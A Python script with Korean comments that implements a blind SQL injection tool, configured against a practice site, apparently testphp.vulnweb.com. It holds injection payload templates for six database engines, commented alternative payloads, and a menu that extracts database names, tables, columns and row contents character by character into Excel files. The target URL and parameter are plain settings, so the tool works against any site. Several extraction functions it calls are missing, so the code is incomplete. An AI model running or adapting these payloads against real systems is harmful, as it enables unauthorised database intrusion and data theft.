import requests
import pandas as pd
from openpyxl import Workbook, load_workbook
from openpyxl.styles import PatternFill, Font, Alignment
import os
import time

# 설정 정보
url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
param_name = "artist"  # 공격할 파라미터 이름
true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
sleep_time = 1.0  # 요청 간 지연 시간 (초)

db_type = None

# SQL Injection 페이로드 템플릿 설정(payload 설정)
payload_templates = {
    "mysql": {
        "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
        "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --",
        "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
        "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
    },
    "mssql": {
        "database_name": "1 AND SUBSTRING(DB_NAME(), {i}, 1) = '{char}' --",
        "table_name": "1 AND SUBSTRING((SELECT name FROM sys.tables ORDER BY name OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}' --",
        "column_name": "1 AND SUBSTRING((SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table_name}') ORDER BY column_id OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}' --",
        "column_data": "1 AND SUBSTRING((SELECT TOP 1 {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {index} ROWS), {i}, 1) = '{char}' --"
    },
    "oracle": {
        "database_name": "1 AND SUBSTR((SELECT sys_context('userenv','db_name') FROM dual), {i}, 1) = '{char}' --",
        "table_name": "1 AND SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM all_tables WHERE owner=USER) WHERE rn={index}), {i}, 1) = '{char}' --",
        "column_name": "1 AND SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_tab_columns WHERE table_name=UPPER('{table_name}')) WHERE rn={index}), {i}, 1) = '{char}' --",
        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name}, ROWNUM AS rn FROM {table_name}) WHERE rn={index}), {i}, 1) = '{char}' --"
    },
    "postgresql": {
        "database_name": "1 AND SUBSTRING((SELECT current_database()), {i}, 1) = '{char}' --",
        "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --",
        "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --",
        "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --"
    },
    "sqlite": {
        "database_name": "1 AND SUBSTR((SELECT name FROM sqlite_master WHERE type='database' LIMIT 1), {i}, 1) = '{char}' --",
        "table_name": "1 AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT {index}, 1), {i}, 1) = '{char}' --",
        "column_name": "1 AND SUBSTR((SELECT name FROM pragma_table_info('{table_name}') LIMIT {index}, 1), {i}, 1) = '{char}' --",
        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM {table_name} LIMIT {index}, 1), {i}, 1) = '{char}' --"
    },
    "db2": {
        "database_name": "1 AND SUBSTR((SELECT CURRENT SERVER FROM sysibm.sysdummy1), {i}, 1) = '{char}' --",
        "table_name": "1 AND SUBSTR((SELECT tabname FROM syscat.tables WHERE tabschema=current_schema ORDER BY tabname OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --",
        "column_name": "1 AND SUBSTR((SELECT colname FROM syscat.columns WHERE tabname='{table_name}' ORDER BY colname OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --",
        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --"
    }
}

# 다양한 SQL 구문 예시 주석 처리:
#### 1. "CASE WHEN" 구문: "1 AND CASE WHEN (조건문) THEN 1 ELSE 0 END = 1 --"
###-- MySQL
#Database Name:1 AND CASE WHEN (SUBSTRING(DATABASE(), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Table Name:1 AND CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Name:1 AND CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Data:1 AND CASE WHEN (SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#
###-- Microsoft SQL Server (MSSQL)
##Database Name:1 AND CASE WHEN (SUBSTRING(DB_NAME(), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Table Name:1 AND CASE WHEN (SUBSTRING((SELECT name FROM sys.tables ORDER BY name OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Name:1 AND CASE WHEN (SUBSTRING((SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table_name}') ORDER BY column_id OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Data:1 AND CASE WHEN (SUBSTRING((SELECT TOP 1 {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {index} ROWS), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#
###-- Oracle
#Database Name:1 AND CASE WHEN (SUBSTR((SELECT sys_context('userenv','db_name') FROM dual), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Table Name:1 AND CASE WHEN (SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM all_tables WHERE owner=USER) WHERE rn={index}), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Name:1 AND CASE WHEN (SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_tab_columns WHERE table_name=UPPER('{table_name}')) WHERE rn={index}), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Data:1 AND CASE WHEN (SUBSTR((SELECT {column_name} FROM (SELECT {column_name}, ROWNUM AS rn FROM {table_name}) WHERE rn={index}), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#
###-- PostgreSQL
#Database Name:1 AND CASE WHEN (SUBSTRING((SELECT current_database()), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Table Name:1 AND CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET {index} LIMIT 1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Name:1 AND CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' OFFSET {index} LIMIT 1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Data:1 AND CASE WHEN (SUBSTRING((SELECT {column_name} FROM {table_name} OFFSET {index} LIMIT 1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#
###-- SQLite
#Database Name:1 AND CASE WHEN (SUBSTR((SELECT name FROM sqlite_master WHERE type='database' LIMIT 1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Table Name:1 AND CASE WHEN (SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT {index}, 1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Name:1 AND CASE WHEN (SUBSTR((SELECT name FROM pragma_table_info('{table_name}') LIMIT {index}, 1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Data:1 AND CASE WHEN (SUBSTR((SELECT {column_name} FROM {table_name} LIMIT {index}, 1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#
###-- DB2
#Database Name:1 AND CASE WHEN (SUBSTR((SELECT CURRENT SERVER FROM sysibm.sysdummy1), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Table Name:1 AND CASE WHEN (SUBSTR((SELECT tabname FROM syscat.tables WHERE tabschema=current_schema ORDER BY tabname OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Name:1 AND CASE WHEN (SUBSTR((SELECT colname FROM syscat.columns WHERE tabname='{table_name}' ORDER BY colname OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#Column Data:1 AND CASE WHEN (SUBSTR((SELECT {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}') THEN 1 ELSE 0 END = 1 --
#
#### 2. "IF" 구문 (MySQL 전용): "1 AND IF(조건문, 1, 0) = 1 --"
#Database Name:1 AND IF(SUBSTRING(DATABASE(), {i}, 1) = '{char}', 1, 0) = 1 --
#Table Name:1 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}', 1, 0) = 1 --
#Column Name:1 AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}', 1, 0) = 1 --
#Column Data:1 AND IF(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}', 1, 0) = 1 --


#### 3. "AND EXISTS" 구문: "1 AND EXISTS(SELECT 1 FROM table_name WHERE 조건문) --"
# Database Name:1 AND EXISTS(SELECT 1 FROM information_schema.schemata WHERE SCHEMA_NAME = DATABASE() AND SUBSTRING(SCHEMA_NAME, {i}, 1) = '{char}') --
# Table Name:1 AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name = (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1) AND SUBSTRING(table_name, {i}, 1) = '{char}') --
# Column Name:1 AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name='{table_name}' AND column_name = (SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1) AND SUBSTRING(column_name, {i}, 1) = '{char}') --
# Column Data:1 AND EXISTS(SELECT 1 FROM {table_name} WHERE SUBSTRING({column_name}, {i}, 1) = '{char}') --

# 참/거짓 판별 함수
def is_true_response(response):
    return true_response_indicator in response.text

# 파일 중복 방지 이름 생성 함수
def generate_unique_filename(base_name="parameters", extension=".xlsx"):
    counter = 1
    filename = f"{base_name}{extension}"
    while os.path.exists(filename):
        filename = f"{base_name}{counter}{extension}"
        counter += 1
    return filename

# 엑셀 파일 저장 함수 (표 형식, 상단 회색 셀, 열 너비 조정)
def save_to_excel(data, base_filename):
    filename = generate_unique_filename(base_name=base_filename)
    df = pd.DataFrame(data)
    
    with pd.ExcelWriter(filename, engine="openpyxl") as writer:
        df.to_excel(writer, index=False, sheet_name="Sheet1")
        workbook = writer.book
        sheet = workbook.active

        # 상단 행 스타일 설정
        header_fill = PatternFill(start_color="CCCCCC", end_color="CCCCCC", fill_type="solid")
        header_font = Font(bold=True)
        for cell in sheet[1]:
            cell.fill = header_fill
            cell.font = header_font
            cell.alignment = Alignment(horizontal="center", vertical="center")

        # 열 너비 조정
        for column_cells in sheet.columns:
            max_length = max(len(str(cell.value)) for cell in column_cells)
            sheet.column_dimensions[column_cells[0].column_letter].width = max_length + 2

    print(f"[완료] 데이터가 '{filename}' 파일로 저장되었습니다.")

# 데이터 저장 여부 확인 함수
def ask_to_save(data, base_filename="parameters"):
    save_choice = input("데이터를 엑셀 파일로 저장하시겠습니까? (Y/N): ").strip().upper()
    if save_choice == "Y":
        save_to_excel(data, base_filename)
    else:
        print("데이터 저장이 취소되었습니다.")

# 데이터베이스 이름 추출 함수
def get_database_name():
    db_name = ""
    print("[정보] 데이터베이스 이름을 찾고 있습니다...")
    for i in range(1, 50):  # 최대 길이 50자 가정
        found_char = False
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
            payload = payload_templates[db_type]["database_name"].format(i=i, char=char)
            params = {param_name: payload}
            response = send_request(params)
            time.sleep(sleep_time)  # 요청 후 지연

            if is_true_response(response):
                db_name += char
                print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                found_char = True
                break
        if not found_char:
            break
    print(f"[완료] 데이터베이스 이름: {db_name}")
    return db_name

# 요청 전송 함수
def send_request(params):
    if request_method == "POST":
        return requests.post(url, data=params, timeout=10, verify=False)
    elif request_method == "GET":
        return requests.get(url, params=params, timeout=10, verify=False)
    else:
        raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")

# 명령 선택 실행 함수
def main():
    global request_method, db_type

    while True:
        print("\n[옵션 선택]")
        print("1. 데이터베이스 추출")
        print("2. 테이블 추출")
        print("3. 컬럼 추출")
        print("4. 데이터 추출")
        print("5. 종료")
        choice = input("작업을 선택하세요: ")

        if choice in ["1", "2", "3", "4"]:
            request_method = input("요청 방식을 선택하세요 (GET/POST): ").strip().upper()
            if request_method not in ["GET", "POST"]:
                print("잘못된 요청 방식입니다. GET 또는 POST 중 하나를 입력하세요.")
                continue

            db_type = input("데이터베이스 종류를 선택하세요 (mysql/mssql/oracle/postgresql/sqlite/db2): ").strip().lower()
            if db_type not in ["mysql", "mssql", "oracle", "postgresql", "sqlite", "db2"]:
                print("잘못된 데이터베이스 종류입니다. mysql, mssql, oracle, postgresql, sqlite, db2 중 하나를 입력하세요.")
                continue

        if choice == "1":
            db_name = get_database_name()
            ask_to_save({"Database Name": [db_name]}, "database_name")
        elif choice == "2":
            limit = input("추출할 테이블 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
            tables = get_table_names(limit)
            ask_to_save({"Table Names": tables}, "tables")
        elif choice == "3":
            table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
            limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
            columns = get_column_names(table_name, limit)
            ask_to_save({"Column Names": columns}, f"{table_name}_columns")
        elif choice == "4":
            table_name = input("데이터를 가져올 테이블 이름을 입력하세요: ")
            column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ")
            limit = input("추출할 데이터 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
            
            if column_name.upper() == "ALL":
                data = get_all_column_data(table_name, limit)
                ask_to_save(data, f"{table_name}_all_columns_data")
            else:
                data = get_column_data(table_name, column_name, limit)
                ask_to_save({column_name: data}, f"{table_name}_{column_name}_data")
        elif choice == "5":
            print("프로그램을 종료합니다.")
            break
        else:
            print("잘못된 선택입니다. 다시 입력하세요.")

# 프로그램 실행
if __name__ == "__main__":
    main()
    
